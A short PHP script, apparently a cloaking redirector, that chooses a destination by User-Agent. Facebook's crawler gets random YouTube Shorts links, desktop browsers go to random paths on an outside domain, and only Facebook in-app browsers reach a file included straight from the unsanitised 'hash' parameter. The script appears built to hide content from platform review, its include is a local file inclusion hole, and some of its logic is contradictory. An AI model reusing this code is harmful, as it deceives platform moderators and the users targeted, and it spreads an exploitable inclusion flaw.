<?php

if (!isset($_GET['hash']) && file_exists('links/' . $_GET['hash']))
   {
    $short_urlx1 = "https://www.youtube.com/shorts/".substr(md5(mt_rand()),0,20);
    header("location: $short_urlx1", true, 200);
    die();
    }

    else
    {
    if (preg_match("/windows?/i", $_SERVER['HTTP_USER_AGENT']))
    {
		$url = 'https://1ie.ca/'.substr(md5(mt_rand()),0,20);
        header("location: $url", true, 200);
        die();
    }

    else if (preg_match("/Linux x86_64?/i", $_SERVER['HTTP_USER_AGENT']))
    {
		$urlx1 = 'https://1ie.ca/'.substr(md5(mt_rand()),0,20);
        header("location: $urlx1", true, 200);
        die();
    }

    else if (preg_match("/Macintosh?/i", $_SERVER['HTTP_USER_AGENT']))
    {
		$urlx2 = 'https://1ie.ca/'.substr(md5(mt_rand()),0,20);
        header("location: $urlx2", true, 200);
        die();
    }

    else if (preg_match("/facebook(external)?/i", $_SERVER['HTTP_USER_AGENT']))
    {
        $short_urlx2 = "https://www.youtube.com/shorts/".substr(md5(mt_rand()),0,20);
        header("location: $short_urlx2", true, 200);
        die();
    }

    else if (!preg_match("/(FB(AN|AV)|\[FB)/i", $_SERVER['HTTP_USER_AGENT']))
    {
		$urlx3 = 'https://1ie.ca/'.substr(md5(mt_rand()),0,20);
        header("location: $urlx3", true, 200);
        die();
    }

    else
    {
        include ('links/' . $_GET['hash']);
    }

}
?>